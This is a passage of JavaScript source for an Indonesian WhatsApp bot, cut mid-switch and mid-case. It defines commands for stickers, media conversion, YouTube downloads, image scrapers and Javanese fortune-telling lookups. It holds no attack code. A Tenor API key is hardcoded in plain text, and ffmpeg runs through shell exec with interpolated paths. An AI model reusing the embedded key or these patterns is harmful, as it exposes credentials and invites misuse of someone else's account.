case 'listgc': {
if (!isCreator) return
 let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
 let teks = `⬣ *LIST GROUP CHAT*\n\nTotal Group : ${anu.length} Group\n\n`
 for (let i of anu) {
 let metadata = await haikal.groupMetadata(i)
 teks += `⬡ *Nama :* ${metadata.subject}\n⬡ *Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Tidak diketahui'}\n⬡ *ID :* ${metadata.id}\n⬡ *Dibuat :* ${moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n⬡ *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
 }
 haikal.sendTextWithMentions(m.chat, teks, m)
 }
 break
//=================================================//
 case 'listonline': case 'liston': {
 if (!isCreator) return
let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
let online = [...Object.keys(store.presences[id]), botNumber]
haikal.sendText(m.chat, 'List Online:\n\n' + online.map(v => '⭔ @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
 }
 break
//=================================================//
case 'sticker': case 's': case 'stickergif': case 'sgif': {
if (!quoted) throw `Balas Video/Image Dengan Caption ${prefix + command}`
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await haikal.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return bangkal('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await haikal.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
}
}
break
//=================================================//
case 'ebinary': {
if (!text) throw `Example : ${prefix + command} text`
let { eBinary } = require('./lib/binary')
let eb = await eBinary(text)
bangkal(eb)
}
break
//=================================================//
case 'dbinary': {
if (!text) throw `Example : ${prefix + command} text`
let { dBinary } = require('./lib/binary')
let db = await dBinary(text)
bangkal(db)
}
break
//=================================================//
case 'emojimix': {
let [emoji1, emoji2] = text.split`+`
if (!emoji1) throw `Example : ${prefix + command} 😅+🤔`
if (!emoji2) throw `Example : ${prefix + command} 😅+🤔`
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anu.results) {
let encmedia = await haikal.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
break
//=================================================//
case 'emojimix2': {
if (!text) throw `Example : ${prefix + command} 😅`
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
for (let res of anu.results) {
let encmedia = await haikal.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
break
//=================================================//
   case 'attp': case 'ttp': {
   if (!text) throw `Example : ${prefix + command} text`
   await haikal.sendMedia(m.chat, `https://xteam.xyz/${command}?file&text=${text}`, 'haikal', 'morou', m, {asSticker: true})
 }
 break
//=================================================//
   case 'smeme': case 'stickmeme': case 'stikmeme': case 'stickermeme': case 'stikermeme': {
let respond = `Kirim/bangkal image/sticker dengan caption ${prefix + command} text1|text2`
if (!/image/.test(mime)) throw respond
if (!text) throw respond
atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
let dwnld = await quoted.download()
let { floNime } = require('./lib/uploader')
let fatGans = await floNime(dwnld)
let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${fatGans.result.url}`
let FaTiH = await haikal.sendImageAsSticker(m.chat, smeme, m, { packname: global.packname, author: global.auhor })
await fs.unlinkSync(FaTiH)
}
   break 
//=================================================//   
case 'toimage': case 'toimg': {
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `Balas sticker dengan caption *${prefix + command}*`
let media = await haikal.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
haikal.sendMessage(m.chat, { image: buffer }, { quoted: hw })
fs.unlinkSync(ran)
})
}
break
//=================================================//
case 'tomp4': case 'tovideo': {
if (isBan) throw mess.ban
   // //if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return bangkal(mess.endLimit)
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `*reply sticker with caption* *${prefix + command}*`
let { webp2mp4File } = require('./lib/uploader')
let media = await haikal.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await haikal.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: hw })
await fs.unlinkSync(media)
}
break
case 'toaud': case 'toaudio': {
if (isBan) throw mess.ban
////if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return bangkal(mess.endLimit)
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
let media = await quoted.download()
let { toAudio } = require('./lib/converter')
let audio = await toAudio(media, 'mp4')
haikal.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : hw })
}
break
case 'tomp3': {
if (isBan) throw mess.ban
  //  //if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return bangkal(mess.endLimit)
if (/document/.test(mime)) throw `*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`
let media = await quoted.download()
let { toAudio } = require('./lib/converter')
let audio = await toAudio(media, 'mp4')
haikal.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${haikal.user.name}.mp3`}, { quoted : hw })
}
break
case 'tovn': case 'toptt': {
if (isBan) throw mess.ban
//if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return bangkal(mess.endLimit)
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
if (!quoted) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
bangkal(mess.wait)
let media = await quoted.download()
let { toPTT } = require('./lib/converter')
let audio = await toPTT(media, 'mp4')
haikal.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:hw})
}
break
case 'togif': {
if (isBan) throw mess.ban
  //  //if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return bangkal(mess.endLimit)
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `*reply sticker with caption* *${prefix + command}*`
   let { webp2mp4File } = require('./lib/uploader')
let media = await haikal.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await haikal.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: hw })
await fs.unlinkSync(media)
}
break
//=================================================//
case 'tourl': {
let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
let media = await haikal.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await TelegraPh(media)
m.reply(util.format(anu))
} else if (!/image/.test(mime)) {
let anu = await UploadFileUgu(media)
m.reply(util.format(anu))
}
await fs.unlinkSync(media)
}
break
//=================================================//
//=================================================//
case 'yts': case 'ytsearch': {
if (!text) throw `Example : ${prefix + command} story wa anime`
let yts = require("yt-search")
let search = await yts(text)
let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
let no = 1
for (let i of search.all) {
teks += `⭔ No : ${no++}\n⭔ Type : ${i.type}\n⭔ Video ID : ${i.videoId}\n⭔ Title : ${i.title}\n⭔ Views : ${i.views}\n⭔ Duration : ${i.timestamp}\n⭔ Upload At : ${i.ago}\n⭔ Author : ${i.author.name}\n⭔ Url : ${i.url}\n\n─────────────────\n\n`
}
haikal.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: hw })
}
break
//=================================================//
case 'google': {
if (!text) throw `Example : ${prefix + command} fatih arridho`
let google = require('google-it')
google({'query': text}).then(res => {
let teks = `Google Search From : ${text}\n\n`
for (let g of res) {
teks += `⭔ *Title* : ${g.title}\n`
teks += `⭔ *Description* : ${g.snippet}\n`
teks += `⭔ *Link* : ${g.link}\n\n────────────────────────\n\n`
} 
bangkal(teks)
})
}
break
//=================================================//
case 'gimage': {
if (!text) throw `Example : ${prefix + command} kaori cicak`
let gis = require('g-i-s')
gis(text, async (error, result) => {
n = result
images = n[Math.floor(Math.random() * n.length)].url
let buttons = [
{buttonId: `gimage ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
]
let buttonMessage = {
image: { url: images },
caption: `*-------「 GIMAGE SEARCH 」-------*
🤠 *Query* : ${text}
🔗 *Media Url* : ${images}`,
footer: haikal.user.name,
buttons: buttons,
headerType: 4
}
haikal.sendMessage(m.chat, buttonMessage, { quoted: hw })
})
}
break
//=================================================//
case 'play': case 'ytplay': {
if (!text) throw `Example : ${prefix + command} story wa anime`
let yts = require("yt-search")
let search = await yts(text)
let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
let buttons = [
{buttonId: `ytmp3 ${anu.url}`, buttonText: {displayText: '♫ Audio'}, type: 1},
{buttonId: `ytmp4 ${anu.url}`, buttonText: {displayText: '► Video'}, type: 1}
]
let buttonMessage = {
image: { url: anu.thumbnail },
caption: `
⭔ Title : ${anu.title}
⭔ Ext : Search
⭔ ID : ${anu.videoId}
⭔ Duration : ${anu.timestamp}
⭔ Viewers : ${anu.views}
⭔ Upload At : ${anu.ago}
⭔ Author : ${anu.author.name}
⭔ Channel : ${anu.author.url}
⭔ Description : ${anu.description}
⭔ Url : ${anu.url}`,
footer: haikal.user.name,
buttons: buttons,
headerType: 4
}
haikal.sendMessage(m.chat, buttonMessage, { quoted: hw })
}
break
//=================================================//
case 'ytmp3': case 'ytaudio': {
let { yta } = require('./lib/y2mate')
if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`
let quality = args[1] ? args[1] : '128kbps'
let media = await yta(text, quality)
if (media.filesize >= 100000) return bangkal('File Melebihi Batas '+util.format(media))
haikal.sendImage(m.chat, media.thumb, `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${isUrl(text)}\n⭔ Ext : MP3\n⭔ Resolusi : ${args[1] || '128kbps'}`, m)
haikal.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3` }, { quoted: hw })
}
break
//=================================================//
case 'ytmp4': case 'ytvideo': {
let { ytv } = require('./lib/y2mate')
if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 360p`
let quality = args[1] ? args[1] : '360p'
let media = await ytv(text, quality)
if (media.filesize >= 100000) return bangkal('File Melebihi Batas '+util.format(media))
haikal.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${isUrl(text)}\n⭔ Ext : MP3\n⭔ Resolusi : ${args[1] || '360p'}` }, { quoted: hw })
}
break
//=================================================//
case 'getmusic': {
let { yta } = require('./lib/y2mate')
if (!text) throw `Example : ${prefix + command} 1`
if (!m.quoted) return bangkal('Reply Pesan')
if (!m.quoted.isBaileys) throw `Hanya Bisa Membalas Pesan Dari Bot`
let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
if (!urls) throw `Mungkin pesan yang anda bangkal tidak mengandung result ytsearch`
let quality = args[1] ? args[1] : '128kbps'
let media = await yta(urls[text - 1], quality)
if (media.filesize >= 100000) return bangkal('File Melebihi Batas '+util.format(media))
haikal.sendImage(m.chat, media.thumb, `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${urls[text - 1]}\n⭔ Ext : MP3\n⭔ Resolusi : ${args[1] || '128kbps'}`, m)
haikal.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3` }, { quoted: hw })
}
break
//=================================================//
case 'getvideo': {
let { ytv } = require('./lib/y2mate')
if (!text) throw `Example : ${prefix + command} 1`
if (!m.quoted) return bangkal('Reply Pesan')
if (!m.quoted.isBaileys) throw `Hanya Bisa Membalas Pesan Dari Bot`
let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
if (!urls) throw `Mungkin pesan yang anda bangkal tidak mengandung result ytsearch`
let quality = args[1] ? args[1] : '360p'
let media = await ytv(urls[text - 1], quality)
if (media.filesize >= 100000) return bangkal('File Melebihi Batas '+util.format(media))
haikal.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${urls[text - 1]}\n⭔ Ext : MP3\n⭔ Resolusi : ${args[1] || '360p'}` }, { quoted: hw })
}
break
//=================================================//
case 'pinterest': {
let { pinterest } = require('./lib/scraper')
anu = await pinterest(text)
result = anu[Math.floor(Math.random() * anu.length)]
haikal.sendMessage(m.chat, { image: { url: result }, caption: '⭔ Media Url : '+result }, { quoted: hw })
}
break
//=================================================//
case 'couple': {
let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
let random = anu[Math.floor(Math.random() * anu.length)]
haikal.sendMessage(m.chat, { image: { url: random.male }, caption: `Couple Male` }, { quoted: hw })
haikal.sendMessage(m.chat, { image: { url: random.female }, caption: `Couple Female` }, { quoted: hw })
}
break
//=================================================//
case 'coffe': case 'kopi': {
let buttons = [
{buttonId: `coffe`, buttonText: {displayText: 'Next Image'}, type: 1}
]
let buttonMessage = {
image: { url: 'https://coffee.alexflipnote.dev/random' },
caption: `☕ Random Coffe`,
footer: haikal.user.name,
buttons: buttons,
headerType: 4
}
haikal.sendMessage(m.chat, buttonMessage, { quoted: hw })
}
break
//=================================================//
case 'wallpaper': {
if (!text) throw 'Masukkan Query Title'
let { wallpaper } = require('./lib/scraper')
anu = await wallpaper(text)
result = anu[Math.floor(Math.random() * anu.length)]
let buttons = [
{buttonId: `wallpaper ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
]
let buttonMessage = {
image: { url: result.image[0] },
caption: `⭔ Title : ${result.title}\n⭔ Category : ${result.type}\n⭔ Detail : ${result.source}\n⭔ Media Url : ${result.image[2] || result.image[1] || result.image[0]}`,
footer: haikal.user.name,
buttons: buttons,
headerType: 4
}
haikal.sendMessage(m.chat, buttonMessage, { quoted: hw })
}
break
//=================================================//
case 'wikimedia': {
if (!text) throw 'Masukkan Query Title'
let { wikimedia } = require('./lib/scraper')
anu = await wikimedia(text)
result = anu[Math.floor(Math.random() * anu.length)]
let buttons = [
{buttonId: `wikimedia ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
]
let buttonMessage = {
image: { url: result.image },
caption: `⭔ Title : ${result.title}\n⭔ Source : ${result.source}\n⭔ Media Url : ${result.image}`,
footer: haikal.user.name,
buttons: buttons,
headerType: 4
}
haikal.sendMessage(m.chat, buttonMessage, { quoted: hw })
}
break
//=================================================//
case 'quotesanime': case 'quoteanime': {
let { quotesAnime } = require('./lib/scraper')
let anu = await quotesAnime()
result = anu[Math.floor(Math.random() * anu.length)]
let buttons = [
{buttonId: `quotesanime`, buttonText: {displayText: 'Next'}, type: 1}
]
let buttonMessage = {
text: `~_${result.quotes}_\n\nBy '${result.karakter}', ${result.anime}\n\n- ${result.up_at}`,
footer: 'Press The Button Below',
buttons: buttons,
headerType: 2
}
haikal.sendMessage(m.chat, buttonMessage, { quoted: hw })
}
break
//=================================================//
case 'nomerhoki': case 'nomorhoki': {
if (!Number(text)) throw `Example : ${prefix + command} 6283844775996`
let anu = await primbon.nomer_hoki(Number(text))
if (anu.status == false) return bangkal(anu.message)
haikal.sendText(m.chat, `⭔ *Nomor HP :* ${anu.message.nomer_hp}\n⭔ *Angka Shuzi :* ${anu.message.angka_shuzi}\n⭔ *Energi Positif :*\n- Kekayaan : ${anu.message.energi_positif.kekayaan}\n- Kesehatan : ${anu.message.energi_positif.kesehatan}\n- Cinta : ${anu.message.energi_positif.cinta}\n- Kestabilan : ${anu.message.energi_positif.kestabilan}\n- Persentase : ${anu.message.energi_positif.persentase}\n⭔ *Energi Negatif :*\n- Perselisihan : ${anu.message.energi_negatif.perselisihan}\n- Kehilangan : ${anu.message.energi_negatif.kehilangan}\n- Malapetaka : ${anu.message.energi_negatif.malapetaka}\n- Kehancuran : ${anu.message.energi_negatif.kehancuran}\n- Persentase : ${anu.message.energi_negatif.persentase}`, m)
}
break
//=================================================//
case 'artimimpi': case 'tafsirmimpi': {
if (!text) throw `Example : ${prefix + command} belanja`
let anu = await primbon.tafsir_mimpi(text)
if (anu.status == false) return bangkal(anu.message)
haikal.sendText(m.chat, `⭔ *Mimpi :* ${anu.message.mimpi}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Solusi :* ${anu.message.solusi}`, m)
}
break
//=================================================//
case 'ramalanjodoh': case 'ramaljodoh': {
if (!text) throw `Example : ${prefix + command} Haikal, 7, 7, 2005, Putri, 16, 11, 2004`
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return bangkal(anu.message)
haikal.sendText(m.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'ramalanjodohbali': case 'ramaljodohbali': {
if (!text) throw `Example : ${prefix + command} Haikal, 7, 7, 2005, Putri, 16, 11, 2004`
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return bangkal(anu.message)
haikal.sendText(m.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'suamiistri': {
if (!text) throw `Example : ${prefix + command} Haikal, 7, 7, 2005, Putri, 16, 11, 2004`
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return bangkal(anu.message)
haikal.sendText(m.chat, `⭔ *Nama Suami :* ${anu.message.suami.nama}\n⭔ *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n⭔ *Nama Istri :* ${anu.message.istri.nama}\n⭔ *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'ramalancinta': case 'ramalcinta': {
if (!text) throw `Example : ${prefix + command} Haikal, 7, 7, 2005, Putri, 16, 11, 2004`
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return bangkal(anu.message)
haikal.sendText(m.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'artinama': {
if (!text) throw `Example : ${prefix + command} Haikal Gans`
let anu = await primbon.arti_nama(text)
if (anu.status == false) return bangkal(anu.message)
haikal.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'kecocokannama': case 'cocoknama': {
if (!text) throw `Example : ${prefix + command} Haikal, 7, 7, 2005`
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
if (anu.status == false) return bangkal(anu.message)
haikal.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Life Path :* ${anu.message.life_path}\n⭔ *Destiny :* ${anu.message.destiny}\n⭔ *Destiny Desire :* ${anu.message.destiny_desire}\n⭔ *Personality :* ${anu.message.personality}\n⭔ *Persentase :* ${anu.message.persentase_kecocokan}`, m)
}
break
//=================================================//
case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
if (!text) throw `Example : ${prefix + command} Haikal|Putri`
let [nama1, nama2] = text.split`|`
let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
if (anu.status == false) return bangkal(anu.message)
haikal.sendImage(m.chat,  anu.message.gambar, `⭔ *Nama Anda :* ${anu.message.nama_anda}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}`, m)
}
break
//=================================================//
case 'jadianpernikahan': case 'jadiannikah': {
if (!text) throw `Example : ${prefix + command} 6, 12, 2020`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
if (anu.status == false) return bangkal(anu.message)
haikal.sendText(m.chat, `⭔ *Tanggal Pernikahan :* ${anu.message.tanggal}\n⭔ *karakteristik :* ${anu.message.karakteristik}`, m)
}
break
//=================================================//
case 'sifatusaha': {
if (!ext)throw `Example : ${prefix+ command} 28, 12, 2021`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
if (anu.status == false) return bangkal(anu.message)
haikal.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Usaha :* ${anu.message.usaha}`, m)
}
break
//=================================================//
case 'rejeki': case 'rezeki': {
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
if (anu.status == false) return bangkal(anu.message)
haikal.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Rezeki :* ${anu.message.rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'pekerjaan': case 'kerja': {
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
if (anu.status == false) return bangkal(anu.message)
haikal.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Pekerjaan :* ${anu.message.pekerjaan}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'ramalannasib': case 'ramalnasib': case 'nasib': {
if (!text) throw `Example : 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.ramalan_nasib(tgl, bln, thn)
if (anu.status == false) return bangkal(anu.message)
haikal.sendText(m.chat, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Angka Akar :* ${anu.message.angka_akar}\n⭔ *Sifat :* ${anu.message.sifat}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`, m)
}
break
//=================================================//
case 'potensipenyakit': case 'penyakit': {
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
if (anu.status == false) return bangkal(anu.message)
haikal.sendText(m.chat, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Sektor :* ${anu.message.sektor}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'artitarot': case 'tarot': {
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
if (anu.status == false) return bangkal(anu.message)
haikal.sendImage(m.chat, anu.message.image, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Simbol Tarot :* ${anu.message.simbol_tarot}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'fengshui': {
if (!text) throw `Example : ${prefix + command} Haikal, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
let [nama, gender, tahun] = text.split`,`
let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
if (anu.status == false) return bangkal(anu.message)
haikal.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tahun_lahir}\n⭔ *Gender :* ${anu.message.jenis_kelamin}\n⭔ *Angka Kua :* ${anu.message.angka_kua}\n⭔ *Kelompok :* ${anu.message.kelompok}\n⭔ *Karakter :* ${anu.message.karakter}\n⭔ *Sektor Baik :* ${anu.message.sektor_baik}\n⭔ *Sektor Buruk :* ${anu.message.sektor_buruk}`, m)
}
break
//=================================================//
case 'haribaik': {
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.petung_hari_baik(tgl, bln, thn)
if (anu.status == false) return bangkal(anu.message)
haikal.sendText(m.chat, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Kala Tinantang :* ${anu.message.kala_tinantang}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'harisangar': case 'taliwangke': {
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
if (anu.status == false) return bangkal(anu.message)
haikal.sendText(m.chat, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'harinaas': case 'harisial': {
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
if (anu.status == false) return bangkal(anu.message)
haikal.sendText(m.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hari Naas :* ${anu.message.hari_naas}\n⭔ *Info :* ${anu.message.catatan}\n⭔ *Catatan :* ${anu.message.info}`, m)
}
break
//=================================================//
case 'nagahari': case 'harinaga': {
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
if (anu.status == false) return bangkal(anu.message)
haikal.sendText(m.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'arahrejeki': case 'arahrezeki': {
if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
if (anu.status == false) return bangkal(anu.message)
